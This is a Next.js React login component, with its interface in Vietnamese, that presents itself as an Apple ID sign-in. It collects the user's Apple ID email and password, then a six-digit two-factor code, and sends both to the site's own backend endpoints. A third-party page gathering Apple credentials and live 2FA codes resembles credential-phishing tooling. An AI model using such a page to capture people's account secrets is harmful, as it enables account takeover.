import { useState } from 'react';
import { useRouter } from 'next/router';

export default function AuthPage() {
  const [step, setStep] = useState(1); // 1: Login, 2: 2FA
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [dsid, setDsid] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [verifyMessage, setVerifyMessage] = useState('');
  const router = useRouter();

  const handleLogin = async () => {
    setIsLoading(true);
    setError('');
    try {
      const response = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();
      console.log('API Response:', data);

      if (data.requires2FA) {
        setDsid(data.dsid);
        setVerifyMessage(data.message || 'Vui lòng nhập mã xác minh 6 chữ số');
        setStep(2); // Chuyển sang bước 2FA
      } else if (data.success) {
        router.push('/');
      } else {
        setError(data.error || 'Đăng nhập thất bại');
      }
    } catch (err) {
      setError('Lỗi kết nối máy chủ');
    } finally {
      setIsLoading(false);
    }
  };

  const handleVerify = async () => {
    setIsLoading(true);
    setError('');
    try {
      const response = await fetch('/api/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, code, dsid }),
      });

      const data = await response.json();
      if (data.success) {
        router.push('/');
      } else {
        setError(data.error || 'Xác thực thất bại');
      }
    } catch (err) {
      setError('Lỗi kết nối máy chủ');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
      <div className="w-full max-w-md bg-white rounded-lg shadow-md overflow-hidden">
        {/* Step 1: Login Form */}
        {step === 1 && (
          <div className="p-6 space-y-4">
            <h1 className="text-2xl font-bold text-center">Đăng nhập Apple ID</h1>
            
            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
                {error}
              </div>
            )}

            <div>
              <label className="block mb-2 text-sm font-medium">Apple ID</label>
              <input
                type="email"
                className="w-full p-2 border rounded"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                disabled={isLoading}
              />
            </div>

            <div>
              <label className="block mb-2 text-sm font-medium">Mật khẩu</label>
              <input
                type="password"
                className="w-full p-2 border rounded"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={isLoading}
              />
            </div>

            <button
              onClick={handleLogin}
              disabled={isLoading}
              className={`w-full py-2 px-4 rounded text-white ${isLoading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'}`}
            >
              {isLoading ? 'Đang xử lý...' : 'Đăng nhập'}
            </button>
          </div>
        )}

        {/* Step 2: 2FA Form */}
        {step === 2 && (
          <div className="p-6 space-y-4">
            <h1 className="text-2xl font-bold text-center">Xác thực 2 bước</h1>
            
            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
                {error}
              </div>
            )}

            <div className="bg-blue-100 border-l-4 border-blue-500 p-4">
              <p>{verifyMessage}</p>
            </div>

            <div>
              <label className="block mb-2 text-sm font-medium">Mã xác minh</label>
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                className="w-full p-2 border rounded text-center text-xl"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                disabled={isLoading}
                placeholder="123456"
              />
            </div>

            <button
              onClick={handleVerify}
              disabled={isLoading || code.length !== 6}
              className={`w-full py-2 px-4 rounded text-white ${isLoading ? 'bg-green-400' : 'bg-green-600 hover:bg-green-700'}`}
            >
              {isLoading ? 'Đang xác thực...' : 'Xác nhận'}
            </button>

            <button
              onClick={() => setStep(1)}
              className="w-full py-2 px-4 bg-gray-200 rounded hover:bg-gray-300"
            >
              Quay lại
            </button>
          </div>
        )}
      </div>
    </div>
  );
}